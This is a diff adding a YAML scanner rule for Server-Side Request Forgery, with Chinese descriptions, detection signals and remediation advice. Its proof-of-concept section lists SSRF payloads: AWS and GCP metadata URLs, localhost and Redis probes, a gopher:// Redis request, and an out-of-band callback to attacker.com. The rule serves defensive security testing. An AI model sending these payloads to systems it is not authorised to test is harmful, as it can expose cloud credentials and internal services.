@@ -1,0 +1,109 @@
+id: "rule-ssrf"
+name: "Server-Side Request Forgery (SSRF)"
+name_cn: "服务器端请求伪造"
+description: "服务器端功能（如 URL 预览、webhook、图片抓取）接受用户提供的 URL 并发起请求，导致攻击者可探测内网、访问云元数据或攻击内网服务"
+
+owasp_category: "A10-ssrf"
+owasp_subcategory: "SSRF"
+cwe_id: "CWE-918"
+
+cvss:
+  vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"
+  base_score: 8.6
+  severity: "high"
+
+detection:
+  methods: ["DAST"]
+  dast_signals:
+    high_specificity:
+      - type: "internal_network_reachable"
+        pattern: "response_contains_internal_service_content"
+        confidence: 0.90
+      - type: "cloud_metadata_access"
+        pattern: "response_contains_aws_gcp_azure_metadata"
+        confidence: 0.95
+      - type: "out_of_band_callback"
+        pattern: "attacker_server_receives_http_request_from_target"
+        confidence: 0.85
+    medium_specificity:
+      - type: "url_parameter"
+        pattern: "(url|link|href|src|target|redirect|callback|webhook|image|fetch|import|proxy)="
+        confidence: 0.50
+      - type: "response_time_diff"
+        pattern: "internal_host_responds_faster_or_slower_than_external"
+        confidence: 0.65
+    low_specificity:
+      - type: "url_reflected"
+        pattern: "user_url_reflected_in_response"
+        confidence: 0.30
+  multi_layer:
+    enabled: true
+    min_signals: 2
+    high_specificity_skips_min: true
+  false_positive_filters:
+    - filter: "allowlist_exists"
+      condition: "url_whitelist_enforced"
+      action: "downgrade"
+      target_confidence: "low"
+
+poc:
+  enabled: true
+  request_template: |
+    POST {{url}} HTTP/1.1
+    Host: {{host}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: {{len}}
+    Connection: close
+
+    {{param}}={{payload}}
+  payloads:
+    - name: "aws_metadata"
+      value: "http://169.254.169.254/latest/meta-data/"
+      description: "AWS 云元数据端点"
+      risk: "critical"
+    - name: "gcp_metadata"
+      value: "http://metadata.google.internal/computeMetadata/v1/"
+      description: "GCP 元数据端点"
+      risk: "critical"
+    - name: "internal_port_scan"
+      value: "http://127.0.0.1:8080/"
+      description: "扫描内网端口"
+      risk: "medium"
+    - name: "localhost_services"
+      value: "http://localhost:6379/"
+      description: "探测内网 Redis"
+      risk: "high"
+    - name: "out_of_band"
+      value: "http://attacker.com/ssrf-test"
+      description: "OOB 回调验证"
+      risk: "medium"
+    - name: "gopher_protocol"
+      value: "gopher://127.0.0.1:6379/_PING"
+      description: "Gopher 协议打内网 Redis"
+      risk: "critical"
+  verification:
+    - type: "content_match"
+      pattern: "ami-id|instance-id|security-groups"
+      description: "响应中出现云元数据"
+    - type: "callback_received"
+      description: "攻击者服务器收到目标发出的 HTTP 请求"
+    - type: "port_scan_diff"
+      description: "不同端口响应时间/状态码差异"
+
+remediation:
+  priority: "P0"
+  summary: "禁止服务器端请求用户指定的任意 URL，使用白名单限制目标域名"
+  details:
+    - "实施 URL 白名单，仅允许请求已知的可信域名"
+    - "解析 URL 后验证最终 IP，禁止访问内网段（10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16）"
+    - "禁用非 HTTP/HTTPS 协议（file://, gopher://, dict://）"
+    - "使用 DNS 重绑定防护，解析后立即连接，避免 TOCTOU"
+    - "网络层隔离：Web 服务器不应能访问内网和云元数据"
+  references:
+    - "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_"
+    - "https://cwe.mitre.org/data/definitions/918.html"
+
+knowledge_source:
+  file: "知识库/ssrf-test.md"
+  methodology: "知识库/ssrf-test.md：内网/元数据/外带 OOB"
